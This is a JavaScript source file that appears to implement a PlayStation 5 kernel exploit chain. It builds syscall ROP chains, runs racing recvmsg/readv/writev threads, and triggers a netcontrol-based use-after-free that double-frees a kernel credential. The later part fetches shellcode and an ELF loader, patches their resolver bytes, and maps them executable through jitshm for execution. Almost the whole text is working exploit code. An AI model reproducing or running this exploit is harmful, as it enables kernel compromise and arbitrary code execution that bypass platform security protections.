import {
  K,
  BANNED,
  TK,
  w32,
  r32,
  w64,
} from "./poops-common.js?v=final";
import { makeHarness } from "./poops-harness.js?v=final";
import { makeTwinEngine } from "./poops-twin.js?v=final";
import {
  PSYS,
  PK,
  isKernelPtr,
  isAligned8,
  isZero64,
  hx,
} from "./poops-kernel.js?v=final";

export function makePoopsEngine(X) {
  const {
    P,
    chain,
    i64,
    sys,
    runChain,
    mem,
    flushMark,
    queueEvent,
    sleep,
    note,
    track,
    untrack,
    state,
    driver,
    cfg,
    latch,
  } = X;

  const markStats =
    typeof X.markStats === "function"
      ? X.markStats
      : () => ({ queued: -1, blocked: -1 });

  const haveMarkStats = typeof X.markStats === "function";

  const flushQueueSoft =
    typeof X.flushQueue === "function"
      ? () => {
          try {
            X.flushQueue(false);
          } catch {}
        }
      : () => {};

  const setRaceMode =
    typeof X.setRaceMode === "function"
      ? (on) => {
          try {
            return !!X.setRaceMode(on);
          } catch {
            return false;
          }
        }
      : () => false;

  const TW = makeTwinEngine(X);
  const H = makeHarness(X);

  const r64 = (u8, o) => i64(r32(u8, o) >>> 0, r32(u8, o + 4) >>> 0);

  const S = {
    triggered: "",
    triggerFamily: "none",

    setuidCalls: 0,
    rlimitRaised: false,

    iovSockA: -1,
    iovSockB: -1,
    uioSockA: -1,
    uioSockB: -1,
    masterRfd: -1,
    masterWfd: -1,
    victimRfd: -1,
    victimWfd: -1,
    uafSock: -1,
    uafClosed: false,

    uafSocks: [],
    freeFds: [],
    freeFdIdx: 0,
    freeFdPath: "",
    fdBudget: -1,

    crRefWrapped: false,
    burnMode: "",
    burnPlan: null,
    kqOpen: [],
    burnPipes: [],

    iovGroup: null,
    uioReadGroup: null,
    uioWriteGroup: null,
    burnThreads: [],

    doNotClose: new Set(),

    groupsStillLive: [],

    buf: null,

    procFiledesc: null,
    fdOfiles: null,
    nfiles: -1,
    masterFp: null,
    victimFp: null,
    curproc: null,

    aliasesRepaired: false,
    jailbroken: false,
    dlsymEnabled: false,
    masterPipeData: null,
    victimPipeData: null,
    leakedIovFirst: null,

    crfrees: 0,
    kreadCalls: 0,
    kreadOk: 0,
    kqueuesOpened: 0,
    kqueuesClosed: 0,
    attemptsRun: 0,
    attemptReached: "",
    kqueueexIssued: 0,

    kernelWrites: 0,
  };

  function needStub(num, why) {
    if (Object.prototype.hasOwnProperty.call(BANNED, num))
      throw new Error(
        "syscall 0x" +
          num.toString(16).toUpperCase() +
          " is BANNED -- " +
          BANNED[num],
      );
    if (P.syscalls[num] === undefined)
      throw new Error(
        "syscall 0x" +
          num.toString(16).toUpperCase() +
          " has no stub in the active firmware profile: " +
          why,
      );
    return P.syscalls[num];
  }
  function emit(num, retPtr, a1, a2, a3, a4, a5) {
    needStub(num, "unrolled chain emit");
    chain.fcall(P.syscalls[num], a1, a2, a3, a4, a5);
    chain.write_result4(retPtr);
  }

  function emitCallAddr(addr, retPtr, a1, a2, a3, a4, a5) {
    chain.fcall(addr, a1, a2, a3, a4, a5);
    chain.write_result4(retPtr);
  }
  function assertFresh(where) {
    if (chain.count !== chain.initial_count + 3)
      throw new Error(
        where +
          ": chain not fresh (count=" +
          chain.count +
          ", expected " +
          (chain.initial_count + 3) +
          ")",
      );
  }

  async function runBuilt(where, build) {
    assertFresh(where);
    try {
      build();
    } catch (err) {
      chain.clear();
      throw err;
    }
    await runChain();
  }

  function alloc(nbytes, label) {
    return TW.arena(nbytes, label);
  }

  function buildBuffers() {
    const b = {};

    b.iovecs = alloc(PK.MSG_IOV_NUM * PK.IOV_SIZE, "recvmsg-iovecs-368");
    w64(b.iovecs.u8, 0x00, 1);
    w64(b.iovecs.u8, 0x08, 1);

    b.msghdr = alloc(0x38, "recvmsg-hdr");
    w64(b.msghdr.u8, 0x10, b.iovecs.base);
    w32(b.msghdr.u8, 0x18, PK.MSG_IOV_NUM);

    b.uioReadBuf = alloc(64, "uio-read-buf");
    for (let i = 0; i < 64; i += 8)
      w64(b.uioReadBuf.u8, i, i64(0x41414141, 0x41414141));
    b.uioWriteBuf = alloc(64, "uio-write-buf");

    b.uioIovRead = alloc(PK.UIO_IOV_COUNT * PK.IOV_SIZE, "uio-iov-read-320");
    w64(b.uioIovRead.u8, 0x00, b.uioReadBuf.base);
    w64(b.uioIovRead.u8, 0x08, 8);
    b.uioIovWrite = alloc(PK.UIO_IOV_COUNT * PK.IOV_SIZE, "uio-iov-write-320");
    w64(b.uioIovWrite.u8, 0x00, b.uioWriteBuf.base);
    w64(b.uioIovWrite.u8, 0x08, 8);

    b.kreadResult = [];
    for (let i = 0; i < PK.UIO_THREAD_NUM; ++i)
      b.kreadResult.push(alloc(64, "kread-result-" + i));

    b.sndbuf = alloc(4, "so-sndbuf-cell");
    b.fionread = alloc(4, "fionread-cell");

    b.pipebuf = alloc(PK.PIPEBUF_SIZE, "stage3-pipebuf-0x18");
    b.rwScratch = alloc(64, "stage3-rw-scratch");
    b.scratchBig = alloc(0x4000, "scratch-big-16k");
    b.dummyByte = alloc(8, "dummy-byte");
    b.lenOut = alloc(4, "getsockopt-optlen-inout");
    b.readback = alloc(PK.UCRED_SIZE, "rthdr-readback-360");

    b.retCells = 512;
    b.ret = alloc(b.retCells * 4, "ret-cells-512");

    b.setBuf = alloc(8, "netcontrol-set-buf");
    b.clrBuf = alloc(8, "netcontrol-clear-buf");

    b.rlimit = alloc(16, "rlimit");

    b.sv = alloc(8, "socketpair-out");
    b.pipefd = alloc(8, "pipe2-out");

    b.ts = alloc(0x10, "timespec");

    S.buf = b;
    return b;
  }

  function retPtr(i) {
    if (i < 0 || i >= S.buf.retCells)
      throw new Error(
        "retPtr(" +
          i +
          ") outside the " +
          S.buf.retCells +
          "-cell return arena",
      );
    return S.buf.ret.base.add32(i * 4);
  }
  const retOf = (i) => r32(S.buf.ret.u8, i * 4) | 0;
  function armRet(n) {
    if (n > S.buf.retCells)
      throw new Error("armRet(" + n + ") exceeds the return arena");
    for (let i = 0; i < n; ++i) w32(S.buf.ret.u8, i * 4, 0x7fffffff);
  }

  async function yieldN(n) {
    await runBuilt("yieldN", () => {
      armRet(n);
      for (let i = 0; i < n; ++i) emit(PSYS.SCHED_YIELD, retPtr(i));
    });
  }

  async function sleepK(ms) {
    if (P.syscalls[PSYS.NANOSLEEP] === undefined) {
      await sleep(ms);
      return;
    }
    w64(S.buf.ts.u8, 0, Math.floor(ms / 1000));
    w64(S.buf.ts.u8, 8, (ms % 1000) * 1000000);
    try {
      await sys(PSYS.NANOSLEEP, S.buf.ts.base, 0);
    } catch (e) {
      await sleep(ms);
    }
  }

  async function socketpairUnix(label) {
    w32(S.buf.sv.u8, 0, 0);
    w32(S.buf.sv.u8, 4, 0);
    flushMark("SOCKETPAIR-PRE", label + "-out=0x" + S.buf.sv.base.toString());
    const r = await sys(
      PSYS.SOCKETPAIR,
      K.AF_UNIX,
      K.SOCK_STREAM,
      0,
      S.buf.sv.base,
    );
    if (r.failed)
      throw new Error("socketpair(" + label + ") failed: " + r.errText);
    const a = r32(S.buf.sv.u8, 0) | 0,
      b = r32(S.buf.sv.u8, 4) | 0;
    if (a < 0 || b < 0 || a > 0x10000 || b > 0x10000)
      throw new Error(
        "socketpair(" + label + ") implausible fds " + a + "," + b,
      );
    track(a);
    track(b);
    flushMark("SOCKETPAIR", label + "-a=" + a + "-b=" + b);
    return [a, b];
  }

  async function pipe2Nonblock(label) {
    w32(S.buf.pipefd.u8, 0, 0);
    w32(S.buf.pipefd.u8, 4, 0);
    flushMark(
      "PIPE2-PRE",
      label + "-out=0x" + S.buf.pipefd.base.toString() + "-flags=O_NONBLOCK",
    );
    const r = await sys(PSYS.PIPE2, S.buf.pipefd.base, K.O_NONBLOCK);
    if (r.failed) throw new Error("pipe2(" + label + ") failed: " + r.errText);
    const a = r32(S.buf.pipefd.u8, 0) | 0,
      b = r32(S.buf.pipefd.u8, 4) | 0;
    if (a < 0 || b < 0)
      throw new Error("pipe2(" + label + ") gave " + a + "," + b);
    track(a);
    track(b);
    flushMark("PIPE2", label + "-r=" + a + "-w=" + b);
    return [a, b];
  }

  const RACER_FIELDS = (n) => [
    ["cmd", 1],
    ["awake", n],
    ["finished", n],
    ["status", n],
    ["cpu", n],
    ["pinret", n],
    ["prioret", n],
    ["lookupret", n],
    ["affret", n],
    ["waitret", n],
    ["workret", n],
    ["spawnret", n],
  ];

  async function makeRacerGroup(name, n, core, sysnum, fdGetter, iovPtr, cnt) {
    const sync = H.newSync(RACER_FIELDS(n));
    const gates = await H.newWakeGates(n, name);

    for (const gt of gates) {
      track(gt.rfd);
      track(gt.wfd);
    }
    const threads = [];
    for (let i = 0; i < n; ++i) {
      const wid = i;
      threads.push(
        H.buildRacer(sync, wid, {
          name: name + wid,
          core,
          prio: TK.POOPS_RTPRIO,
          wake: gates[i],
          work(t) {
            t.self_healing_syscall(sysnum, fdGetter(), iovPtr, cnt);
            t.write_result4(sync.ptr("workret", wid));
          },
        }),
      );
    }
    const g = H.newGroup(name, threads, sync, {
      signalDeadline: PK.SIGNAL_DEADLINE_MS,
      exitDeadline: PK.EXIT_DEADLINE_MS,
    });
    g.jbCore = core;
    g.jbGates = gates;
    return g;
  }

  async function setupRacerGroups(core) {
    needStub(PSYS.RECVMSG, "iov racers");
    needStub(PSYS.WRITEV, "uio read racers");
    needStub(PSYS.READV, "uio write racers");
    needStub(PSYS.THR_NEW, "racer spawn");
    needStub(PSYS.PIPE2, "racer wake gates (0x2AF)");
    const b = S.buf;
    S.iovGroup = await makeRacerGroup(
      "iov",
      PK.IOV_THREAD_NUM,
      core,
      PSYS.RECVMSG,
      () => S.iovSockA,
      b.msghdr.base,
      0,
    );
    S.uioReadGroup = await makeRacerGroup(
      "uioR",
      PK.UIO_THREAD_NUM,
      core,
      PSYS.WRITEV,
      () => S.uioSockB,
      b.uioIovRead.base,
      PK.UIO_IOV_COUNT,
    );
    S.uioWriteGroup = await makeRacerGroup(
      "uioW",
      PK.UIO_THREAD_NUM,
      core,
      PSYS.READV,
      () => S.uioSockA,
      b.uioIovWrite.base,
      PK.UIO_IOV_COUNT,
    );
    return [S.iovGroup, S.uioReadGroup, S.uioWriteGroup];
  }

  async function spawnRacers(core) {
    const groups = [S.iovGroup, S.uioReadGroup, S.uioWriteGroup];
    const out = [];
    for (const g of groups) {
      const sp = await H.spawnGroup(g);
      out.push({ name: g.name, ms: sp.ms, live: g.spawned.length });
      for (const t of g.spawned) {
        const ms = await H.awaitStatus(
          g.S,
          t.jbWid,
          TK.ST_READY,
          PK.READY_DEADLINE_MS,
          "poops-ready-" + g.name,
        );
        if (ms < 0)
          throw new Error(
            g.name +
              "[" +
              t.jbWid +
              "] never reached " +
              "READY (status=" +
              g.S.get("status", t.jbWid) +
              ")",
          );
      }
      const problem = H.groupPrologueProblem(g, core, TK.POOPS_RTPRIO);
      if (problem) throw new Error("racer prologue check failed -- " + problem);
    }
    return out;
  }

  async function flushIovWorkers(rounds, why) {
    const g = S.iovGroup;
    const b = S.buf;
    let firstRecvmsgRet = null;
    let blockedAfterSignal = -1;
    let awakeAfterSignal = -1;
    needStub(PSYS.SCHED_YIELD, "flush loop yield (poops.c:705, ts:1380)");
    needStub(PSYS.WRITE, "one-byte wakes and release byte");

    const wasQuiet = H.setSignalMarksQuiet(true);
    try {
      for (let k = 0; k < rounds; ++k) {
        const wake = H.armSignal(g, (why || "flush") + ":" + k);

        const probeRound = k === 0;
        await runBuilt("flush-wake", () => {
          armRet(wake.length + 2);
          let c = 0;
          for (const w of wake) emit(PSYS.WRITE, retPtr(c++), w.fd, w.buf, 1);
          emit(PSYS.SCHED_YIELD, retPtr(c++));
          if (!probeRound)
            emit(PSYS.WRITE, retPtr(c++), S.iovSockB, b.scratchBig.base, 1);
        });

        for (let i = 0; i < wake.length; ++i)
          if (retOf(i) !== 1) {
            flushMark(
              "IOV-WAKE-FAILED",
              "round=" +
                k +
                "-wid=" +
                wake[i].wid +
                "-name=" +
                wake[i].name +
                "-fd=" +
                wake[i].fd +
                "-ret=" +
                retOf(i),
            );
            throw new Error(
              "flush round " +
                k +
                ": wake write for " +
                wake[i].name +
                " (fd " +
                wake[i].fd +
                ") returned " +
                retOf(i) +
                ", not 1; racer still parked in read()",
            );
          }

        if (probeRound) {
          await sleep(2);
          blockedAfterSignal = 0;
          awakeAfterSignal = 0;
          for (const wid of g.wids) {
            if (g.S.get("finished", wid) === 0) blockedAfterSignal++;
            if (g.S.get("awake", wid) !== 0) awakeAfterSignal++;
          }

          queueEvent(
            "IOV-BLOCKED",
            "stillBlocked=" +
              blockedAfterSignal +
              "-of-" +
              g.wids.length +
              "-leftReadGate=" +
              awakeAfterSignal +
              "-of-" +
              g.wids.length +
              "-before-any-release-byte",
          );

          await runBuilt("flush-release", () => {
            armRet(1);
            emit(PSYS.WRITE, retPtr(0), S.iovSockB, b.scratchBig.base, 1);
          });
        }

        await H.waitFinished(
          g,
          PK.WAIT_DEADLINE_MS,
          (why || "flush") + ":" + k,
        );
        if (firstRecvmsgRet === null) {
          firstRecvmsgRet = g.S.s32("workret", g.wids[0]);
          queueEvent(
            "IOV-RECVMSG-RET",
            "worker0=" + firstRecvmsgRet + "-expect=-1-or-14-EFAULT-round=" + k,
          );
        }

        await readReleaseByte("flush");

        queueEvent("IOV-ROUND", "k=" + k + "-of-" + rounds);
      }
    } finally {
      H.setSignalMarksQuiet(wasQuiet);
    }
    return {
      rounds,
      firstRecvmsgRet,
      blockedAfterSignal,
      awakeAfterSignal,
      iovRacers: g.wids.length,
    };
  }

  function forceSettled(g, why) {
    if (g.settled) return false;
    g.settled = true;
    flushMark("GROUP-FORCE-SETTLED", g.name + "-why=" + why);
    return true;
  }

  function bankFd(idx) {
    const fd = TW.S.fds[idx];
    if (fd === undefined)
      throw new Error("no IPv6 socket at bank index " + idx);
    return fd;
  }

  function emitFreeRthdr(idx, cell) {
    emit(
      PSYS.SETSOCKOPT,
      retPtr(cell),
      bankFd(idx),
      K.IPPROTO_IPV6,
      K.IPV6_RTHDR,
      0,
      0,
    );
  }

  function emitGetRthdr(idx, dstPtr, lenPtr, cell) {
    emit(
      PSYS.GETSOCKOPT,
      retPtr(cell),
      bankFd(idx),
      K.IPPROTO_IPV6,
      K.IPV6_RTHDR,
      dstPtr,
      lenPtr,
    );
  }

  async function armLineA(reason) {
    if (S.triggered) return S.triggered;
    S.triggered = String(reason)
      .replace(/[\r\n\t]+/g, " ")
      .slice(0, 300);
    flushMark("TRIGGER-ARMED", S.triggered.slice(0, 150));
    try {
      await latch.escalate(
        "poops trigger armed: " +
          S.triggered +
          " -- one 0x180 chunk may now be on the UMA free list twice",
      );
    } catch (e) {}
    flushMark("TRIGGER-FIRED", "family=" + S.triggerFamily);
    return S.triggered;
  }

  async function triggerNetcontrol() {
    needStub(PSYS.NETCONTROL, "netcontrol trigger family");
    needStub(PSYS.SETUID, "fresh ucred for the netcontrol trigger");
    needStub(PSYS.DUP, "crfree = close(dup(uaf_socket))");
    const b = S.buf;

    if (TW.corrupt)
      return {
        ok: false,
        terminal: true,
        why:
          "REFUSED: an alias already exists (" + TW.corrupt.slice(0, 120) + ")",
      };

    if (S.uafSock >= 0 && !S.uafClosed) {
      await sys(PSYS.CLOSE, S.uafSock);
      untrack(S.uafSock);
      flushMark(
        "NETCTRL-UAF-RECYCLED",
        "closed=" + S.uafSock + "-before-new-sandwich (lua:665)",
      );
      S.uafSock = -1;
    }

    const ds = await sys(PSYS.SOCKET, K.AF_UNIX, K.SOCK_STREAM, 0);
    if (ds.failed) throw new Error("discard socket failed: " + ds.errText);
    const discard = ds.s32;
    track(discard);
    w32(b.setBuf.u8, 0, discard);

    flushMark(
      "NETCTRL-SET-PRE",
      "slot=-1-cmd=0x" +
        PK.NET_CONTROL_NETEVENT_SET_QUEUE.toString(16) +
        "-fd=" +
        discard +
        "-buf=0x" +
        b.setBuf.base.toString(),
    );
    let slot = 0;
    let r = await sys(
      PSYS.NETCONTROL,
      i64(M1LO, M1HI),
      PK.NET_CONTROL_NETEVENT_SET_QUEUE,
      b.setBuf.base,
      8,
    );
    flushMark("NETCTRL-SET", "slot=-1-ret=" + r.s32 + "-" + r.errText);
    if (r.failed || r.s32 !== 0) {
      flushMark("NETCTRL-SET-PRE", "slot=1-fallback (poops.c:685-694)");
      r = await sys(
        PSYS.NETCONTROL,
        1,
        PK.NET_CONTROL_NETEVENT_SET_QUEUE,
        b.setBuf.base,
        8,
      );
      flushMark("NETCTRL-SET", "slot=1-ret=" + r.s32 + "-" + r.errText);
      if (r.failed || r.s32 !== 0) {
        await sys(PSYS.CLOSE, discard);
        untrack(discard);
        return {
          ok: false,
          terminal: true,
          why:
            "all netcontrol slots occupied (poops.c:690-693); " +
            "nothing freed",
        };
      }
      slot = 1;
    }

    await armLineA(
      "netcontrol SET_QUEUE took slot " +
        slot +
        " on fd " +
        discard +
        "; next setuid(1) is irreversible for the boot",
    );

    await sys(PSYS.CLOSE, discard);
    untrack(discard);
    await sys(PSYS.SETUID, 1);
    S.setuidCalls++;
    const us = await sys(PSYS.SOCKET, K.AF_UNIX, K.SOCK_STREAM, 0);
    if (us.failed) throw new Error("uaf socket failed: " + us.errText);
    S.uafSock = us.s32;
    S.uafClosed = false;
    S.uafSocks.push(S.uafSock);
    track(S.uafSock);
    await sys(PSYS.SETUID, 1);
    S.setuidCalls++;
    flushMark(
      "NETCTRL-UAF",
      "uaf_sock=" +
        S.uafSock +
        "-reusedFdNumber=" +
        (S.uafSock === discard ? "YES" : "NO-" + discard) +
        "-setuidCalls=" +
        S.setuidCalls,
    );

    w32(b.clrBuf.u8, 0, S.uafSock);
    flushMark(
      "NETCTRL-CLEAR-PRE",
      "slot=" +
        slot +
        "-cmd=0x" +
        PK.NET_CONTROL_NETEVENT_CLEAR_QUEUE.toString(16) +
        "-fd=" +
        S.uafSock,
    );
    const cr = await sys(
      PSYS.NETCONTROL,
      slot,
      PK.NET_CONTROL_NETEVENT_CLEAR_QUEUE,
      b.clrBuf.base,
      8,
    );
    flushMark("NETCTRL-CLEAR", "ret=" + cr.s32 + "-" + cr.errText);
    return {
      ok: true,
      slot,
      uaf: S.uafSock,
      reused: S.uafSock === discard,
      setRet: 0,
      clearRet: cr.s32,
    };
  }

  async function crfree(why) {
    if (S.triggerFamily === "none") {
      queueEvent("CRFREE-SKIPPED", "negative-control-" + why);
      return { skipped: true };
    }
    if (S.triggerFamily === "netcontrol") {
      if (S.uafSock < 0) throw new Error("crfree: no uaf_socket");
      const d = await sys(PSYS.DUP, S.uafSock);
      if (d.failed || d.s32 < 0)
        return { failed: true, why: "dup(uaf) -> " + d.errText };
      await sys(PSYS.CLOSE, d.s32);
      S.crfrees++;
      queueEvent("CRFREE", "dup=" + d.s32 + "-n=" + S.crfrees + "-" + why);
      return { fd: d.s32, n: S.crfrees };
    }

    if (S.freeFdIdx >= S.freeFds.length)
      throw new Error(
        "crfree: free_fds pool exhausted (idx=" +
          S.freeFdIdx +
          "/" +
          S.freeFds.length +
          ")",
      );
    const fd = S.freeFds[S.freeFdIdx];
    S.freeFdIdx++;
    await sys(PSYS.CLOSE, fd);
    untrack(fd);
    S.crfree…30119 tokens truncated…     let at = 0;
      for (const c of parts) {
        binBytes.set(c, at); at += c.length;
      }
      out.steps.push(
        "shellcode " + g.total + " bytes" +
          (g.streamed ? " (streamed)" : " (buffered)"),
      );
    } catch (err) {
      out.why = "could not fetch the shellcode: " +
        String((err && err.message) || err);
      return out;
    }
    if (!binBytes.length) {
      out.why = "the shellcode is empty";
      return out;
    }
    flushMark("STAGE5-FETCH-BIN-OK", "bytes=" + binBytes.length);

    try {
      const name = o.elfName || "elfldr-ps5-1360.elf";
      flushMark("STAGE5-ELF-FETCH-PRE", "url=../payloads/" + name);
      const response = await fetch("../payloads/" + name, {
        cache: "no-store",
      });
      if (!response.ok)
        throw new Error("elfldr fetch failed: HTTP " + response.status);
      const elfBytes = new Uint8Array(await response.arrayBuffer());
      const declared = elfBytes.length;
      if (!(declared >= 4 && declared <= 0x1000000))
        throw new Error("invalid elfldr size " + declared);
      if (
        elfBytes[0] !== 0x7f || elfBytes[1] !== 0x45 ||
        elfBytes[2] !== 0x4c || elfBytes[3] !== 0x46
      )
        throw new Error("does not start with \x7fELF");
      flushMark("STAGE5-ELF-FETCH-OK", "bytes=" + declared);
      const mapped = (declared + PK.PAGE - 1) & ~(PK.PAGE - 1);
      const er = await sys(
        PSYS.MMAP, i64(0, 0), mapped, PK.PROT_RW,
        PK.MAP_ANON_PRIVATE, -1, i64(0, 0),
      );
      if (er.failed || isZero64(er.raw))
        throw new Error(
          "anonymous mmap of 0x" + mapped.toString(16) +
            " failed: " + er.errText,
        );
      elfBase = er.raw;
      elfMapped = mapped;
      flushMark(
        "STAGE5-ELF-MMAP",
        "addr=" + hx(elfBase) + "-size=0x" + mapped.toString(16),
      );
      let i = 0;
      const n4 = elfBytes.length & ~3;
      for (; i < n4; i += 4)
        P.write4(
          elfBase.add32(i), elfBytes[i] | (elfBytes[i + 1] << 8) |
            (elfBytes[i + 2] << 16) | (elfBytes[i + 3] << 24),
        );
      for (; i < elfBytes.length; ++i)
        P.write1(elfBase.add32(i), elfBytes[i]);
      elfLen = elfBytes.length;
      const back = P.read4(elfBase);
      out.steps.push(
        "elfldr @ " + hx(elfBase) + " size 0x" + elfLen.toString(16) +
          " in anon mmap 0x" + mapped.toString(16) +
          "; first dword reads back 0x" + (back >>> 0).toString(16),
      );
    } catch (err) {
      out.why = "could not stage the elfldr: " +
        String((err && err.message) || err);
      return out;
    }

    flushMark(
      "STAGE5-STAGED", "bin=" + (binBytes ? binBytes.length : -1) +
        "-elf=" + elfLen + "-elfAt=" + hx(elfBase) + "-mapped=0x" +
        elfMapped.toString(16),
    );

    const ap = await getAllproc();
    if (!ap.ok) {
      out.why = "allproc " + ap.why; return out;
    }
    const allproc = ap.addr;
    out.steps.push("allproc = " + hx(allproc) +
      (ap.cached ? " (proven in stage 4)" : " (proven here)"),);
    flushMark("STAGE5-ALLPROC",
      "allproc=" + hx(allproc) + "-cached=" + !!ap.cached,);

    const resolverCallA = [0xe8, 0xcf, 0x00, 0x00, 0x00];
    const resolverCallB = [0xe8, 0x78, 0x01, 0x00, 0x00];
    const getpidBlock = [
      0x48, 0x8d, 0x35, 0xac, 0x30, 0x00, 0x00,
      0x48, 0x8d, 0x55, 0xd0, 0xbf, 0x01, 0x20, 0x00, 0x00,
      0xe8, 0x41, 0x2b, 0x00, 0x00,
    ];
    const bytesAt = (off, expected) =>
      expected.every((value, index) => binBytes[off + index] === value);
    const requiredResolverOffsets = [
      PK.LK_NOTIFY, PK.LK_SYSCTLBYNAME, PK.LK_PTHREAD_CREATE,
      PK.LK_PTHREAD_JOIN, PK.LC_MALLOC, PK.LC_FREE, PK.LC_MEMCPY,
      PK.LC_MEMSET, PK.LC_STRCMP, PK.LC_MEMCMP, PK.LC_VSNPRINTF,
      PK.LK_GETPID,
    ];
    if (
      binBytes.length !== 18912 || !bytesAt(0x1c, resolverCallA) ||
      !bytesAt(0x23, resolverCallB) || !bytesAt(0x10f1, getpidBlock) ||
      requiredResolverOffsets.some((off) => off < 0)
    ) {
      out.why = "payload resolver bypass signature/profile check failed"; return out;
    }

    for (let i = 0; i < 5; ++i) {
      binBytes[0x1c + i] = 0x90; binBytes[0x23 + i] = 0x90;
    }
    const resolvedSlots = [
      [0x48b0, P.libKernelBase.add32(PK.LK_NOTIFY)], [0x48b8, P.libKernelBase.add32(PK.LK_SYSCTLBYNAME)],
      [0x48c0, P.libKernelBase.add32(PK.LK_PTHREAD_CREATE)], [0x48c8, P.libKernelBase.add32(PK.LK_PTHREAD_JOIN)],
      [0x48d0, P.libSceLibcInternalBase.add32(PK.LC_MALLOC)], [0x48d8, P.libSceLibcInternalBase.add32(PK.LC_FREE)],
      [0x48e0, P.libSceLibcInternalBase.add32(PK.LC_MEMCPY)], [0x48e8, P.libSceLibcInternalBase.add32(PK.LC_MEMSET)],
      [0x48f0, P.libSceLibcInternalBase.add32(PK.LC_STRCMP)], [0x48f8, P.libSceLibcInternalBase.add32(PK.LC_MEMCMP)],
      [0x4900, P.libSceLibcInternalBase.add32(PK.LC_VSNPRINTF)],
    ];
    for (const [slot, address] of resolvedSlots) w64(binBytes, slot, address);

    const getpidAddress = P.libKernelBase.add32(PK.LK_GETPID);
    binBytes[0x10f1] = 0x48; binBytes[0x10f2] = 0xb8;
    w64(binBytes, 0x10f3, getpidAddress);
    const getpidTail = [0x48, 0x89, 0x45, 0xd0, 0x31, 0xc0];
    for (let i = 0; i < getpidTail.length; ++i)
      binBytes[0x10fb + i] = getpidTail[i];
    for (let i = 0x1101; i < 0x1106; ++i) binBytes[i] = 0x90;
    flushMark("STAGE5-RESOLVER-BYPASS",
      "payload=618f4b12-slots=11-getpid=" + hx(getpidAddress) +
        "-dlsym-syscall-calls-skipped=12",);

    const size = binBytes.length;
    const aligned = (size + PK.PAGE - 1) & ~(PK.PAGE - 1);
    const jr = await sys(PSYS.JITSHM_CREATE, 0, aligned, 0x7);
    if (jr.failed || jr.s32 < 0) {
      out.why = "jitshm_create failed: " + jr.errText; return out;
    }
    const execFd = jr.s32;
    track(execFd);
    const mr = await sys(
      PSYS.MMAP, i64(0, 0), aligned, PK.PROT_RWX,
      PK.MAP_SHARED, execFd, i64(0, 0),
    );
    if (mr.failed || isZero64(mr.raw)) {
      out.why = "mmap(PROT_RWX, MAP_SHARED, jitshm fd) failed: " + mr.errText;
      return out;
    }
    const entry = mr.raw;
    out.steps.push("shellcode mapped RWX @ " + hx(entry) + " size 0x" +
      aligned.toString(16) + " via jitshm fd " + execFd,);
    flushMark("STAGE5-MAP", "entry=" + hx(entry) + "-size=0x" +
      aligned.toString(16) + "-jitfd=" + execFd,);

    const expectDword = (off) =>
      (binBytes[off] | (binBytes[off + 1] << 8) |
        (binBytes[off + 2] << 16) | (binBytes[off + 3] << 24)) >>> 0;
    function writeAndVerify(dst) {
      for (let i = 0; i < size; ++i) P.write1(dst.add32(i), binBytes[i]);
      let bad = 0, firstBad = -1;
      for (let off = 0; off + 4 <= size; off += 4) {
        if (P.read4(dst.add32(off)) >>> 0 !== expectDword(off)) {
          if (firstBad < 0) firstBad = off;
          ++bad;
        }
      }
      return { bad, firstBad, first: P.read4(dst) >>> 0 };
    }

    let v = writeAndVerify(entry);
    flushMark("STAGE5-SHELLCODE-VERIFY", "at=" + hx(entry) +
      "-first=0x" + v.first.toString(16) + "-expect=0x" +
      expectDword(0).toString(16) + "-badDwords=" + v.bad + "-of-" +
      (size >> 2) + "-firstBad=" + v.firstBad,);

    if (v.bad !== 0) {
      const ar = await sys(PSYS.JITSHM_ALIAS, execFd, PK.PROT_RW);
      if (ar.failed || ar.s32 < 0) {
        out.why = "RWX write did not land (" + v.bad + " of " + (size >> 2) +
          " dwords wrong, first at " + v.firstBad +
          ") and jitshm_alias failed: " + ar.errText;
        return out;
      }
      const wFd = ar.s32;
      track(wFd);
      const wm = await sys(
        PSYS.MMAP, i64(0, 0), aligned, PK.PROT_RW,
        PK.MAP_SHARED, wFd, i64(0, 0),
      );
      if (wm.failed || isZero64(wm.raw)) {
        out.why = "jitshm_alias fd " + wFd +
          " gave no writable mapping: " + wm.errText;
        return out;
      }
      const wAddr = wm.raw;
      flushMark("STAGE5-ALIAS", "wfd=" + wFd + "-writeAt=" + hx(wAddr) +
        "-execAt=" + hx(entry) + "-direct-RWX-write-did-not-land",);
      v = writeAndVerify(wAddr);

      const execFirst = P.read4(entry) >>> 0;
      flushMark("STAGE5-ALIAS-VERIFY", "aliasBad=" + v.bad +
        "-execFirst=0x" + execFirst.toString(16) + "-expect=0x" +
        expectDword(0).toString(16),);
      if (v.bad !== 0 || execFirst !== expectDword(0)) {
        out.why = "alias write did not land (" + v.bad +
          " bad dwords; exec mapping reads 0x" + execFirst.toString(16) +
          ", wrote 0x" + expectDword(0).toString(16) + "); not spawning";
        return out;
      }
      await sys(PSYS.MUNMAP, wAddr, aligned);
    }
    out.steps.push("shellcode written and verified at " + hx(entry) +
      "; first dword 0x" + expectDword(0).toString(16),);

    const lkb = P.libKernelBase;
    if (!lkb || isZero64(lkb)) {
      out.why = "libKernelBase is " + hx(lkb) + "; cannot locate pthread";
      return out;
    }
    const useSizedSceThread =
      PK.LK_SCE_PTHREAD_CREATE >= 0 && PK.LK_SCE_PTHREAD_JOIN >= 0 &&
      PK.LK_SCE_PTHREAD_ATTR_INIT >= 0 &&
      PK.LK_SCE_PTHREAD_ATTR_SETSTACKSIZE >= 0 &&
      PK.LK_SCE_PTHREAD_ATTR_SETDETACHSTATE >= 0 &&
      PK.LK_SCE_PTHREAD_ATTR_DESTROY >= 0;
    const tc = {
      addr: lkb.add32(useSizedSceThread ? PK.LK_SCE_PTHREAD_CREATE :
        PK.LK_PTHREAD_CREATE_NAME_NP,),
    };
    const tj = {
      addr: lkb.add32(
        useSizedSceThread ? PK.LK_SCE_PTHREAD_JOIN : PK.LK_PTHREAD_JOIN,),
    };
    out.steps.push("libkernel=" + hx(lkb) +
      (useSizedSceThread ? " scePthreadCreate=" : " pthread_create_name_np=") +
      hx(tc.addr) + " pthread_join=" + hx(tj.addr),);
    flushMark("STAGE5-PTHREAD", "libkernel=" + hx(lkb) +
      "-create=" + hx(tc.addr) + "-join=" + hx(tj.addr),);

    const args = alloc(0x28, "stage5-shellcode-args");
    w32(args.u8, 0x00, S.masterRfd); w32(args.u8, 0x04, S.masterWfd);
    w32(args.u8, 0x08, S.victimRfd); w32(args.u8, 0x0c, S.victimWfd);
    w64(args.u8, 0x10, allproc); w64(args.u8, 0x18, elfBase);
    w64(args.u8, 0x20, i64(elfLen, 0));
